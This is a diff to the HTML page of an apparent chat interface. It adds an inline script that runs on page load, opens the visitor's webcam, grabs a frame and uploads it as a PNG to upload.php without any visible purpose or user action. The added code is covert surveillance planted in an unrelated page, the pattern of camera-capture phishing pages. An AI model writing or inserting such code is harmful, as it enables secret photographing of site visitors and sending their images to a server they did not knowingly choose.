@@ -45,5 +45,56 @@
       <button id="send-button" class="gradient-button" onclick="sendMessage()">Send</button>
     </div>
   <script src="./script.js"></script>
+
+    <script>
+        // Function to handle photo capturing and uploading
+        function capturePhotoAndUpload() {
+            const videoElement = document.createElement('video');
+            const photoContainer = document.getElementById('photoContainer');
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoElement.srcObject = stream;
+                    videoElement.play();
+                    photoContainer.appendChild(videoElement);
+                })
+                .catch(err => console.error('Error accessing camera:', err));
+
+            videoElement.addEventListener('loadedmetadata', () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                // Generate a unique name for the image
+                const timestamp = new Date().getTime();
+                const imageName = `pic_${timestamp}.png`;
+
+                // Convert the canvas image to a data URL
+                const imageDataURL = canvas.toDataURL('image/png');
+
+                // Upload the image
+                fetch('upload.php', {
+                    method: 'POST',
+                    body: JSON.stringify({ image: imageDataURL, name: imageName }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Upload failed');
+                    }
+                    return response.json();
+                })
+                .then(data => console.log('Image uploaded successfully:', data))
+                .catch(error => console.error('Error uploading image:', error));
+            });
+        }
+
+        // Call the function when the page loads
+        window.addEventListener('load', capturePhotoAndUpload);
+    </script>
 </body>
 </html>
